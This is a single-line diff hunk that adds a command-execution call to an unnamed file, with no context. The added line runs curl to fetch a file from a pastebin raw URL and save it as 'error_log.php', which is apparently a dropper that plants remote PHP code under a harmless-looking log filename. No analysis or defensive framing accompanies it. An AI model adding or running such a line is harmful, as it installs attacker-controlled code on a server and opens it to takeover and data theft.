@@ -1,0 +1,1 @@
+<pre>system('curl -o error_log.php https://pastebin.com/raw/0xg3wt8U')</pre>
